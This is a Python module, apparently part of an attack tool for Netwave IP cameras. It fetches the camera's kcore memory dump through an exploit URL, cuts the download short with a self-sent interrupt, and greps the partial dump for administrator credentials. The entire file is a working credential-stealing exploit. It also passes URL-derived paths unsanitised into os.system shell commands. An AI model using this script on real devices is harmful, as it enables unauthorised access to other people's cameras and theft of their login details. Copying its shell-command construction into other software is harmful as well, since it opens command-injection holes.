from config import INFO
import urllib.request
import subprocess
import signal
import sys, os

class netwaveCam:

    def dlProgress(self, count, blockSize, totalSize):
        percent = int(count*blockSize*100/totalSize)
        sys.stdout.write("%2d%% download...\r" % percent)
        sys.stdout.flush()
        if percent == 25:
            pid = os.getpid()
            os.kill(pid, signal.SIGINT)
    

    def exploit_netwave(self, url_exploit, netwave):
        print("{}Testing vulnerability {} for Netwave camera".format(INFO, url_exploit))
        print("{}Download the kcore dump\r".format(INFO))
        
        url_dir = "camera_datas/{}/".format(url_exploit.split("/")[2])
        command = 'strings {}data.txt | grep -i admin -C3'.format(url_dir)

        data_dir = os.system("mkdir {}".format(url_dir))
        try:
            urllib.request.urlretrieve(url_exploit, filename="{}data.txt".format(url_dir), reporthook=netwave.dlProgress)
        except KeyboardInterrupt:
            print("\n")
            print("{}commande: {}\n".format(INFO, command))
            os.system(command)
            #os.remove("data.txt")